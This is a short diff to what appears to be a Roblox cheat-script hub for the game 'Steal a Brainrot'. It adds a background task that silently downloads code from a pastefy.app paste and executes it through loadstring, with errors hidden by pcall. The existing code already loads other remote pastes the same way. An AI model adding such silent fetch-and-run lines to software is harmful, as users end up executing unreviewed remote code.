@@ -48,6 +48,13 @@ local GAMES = {
 		Name = "Steal a Brainrot",
 		PlaceIds = {85621847059032,96342491571673,99392882090073,99606176102979,109983668079237,128762245270197},
 		Load = function()
+			-- Executes your new Brainrot script additions
+			task.spawn(function()
+				pcall(function()
+					loadstring(game:HttpGet("https://pastefy.app/Ntb0vEKv/raw"))()
+				end)
+			end)
+
 			if currentPlaceId == 99606176102979 then
 				loadstring(game:HttpGet("https://pastefy.app/pOKgt6Z2/raw", true))()
 				return
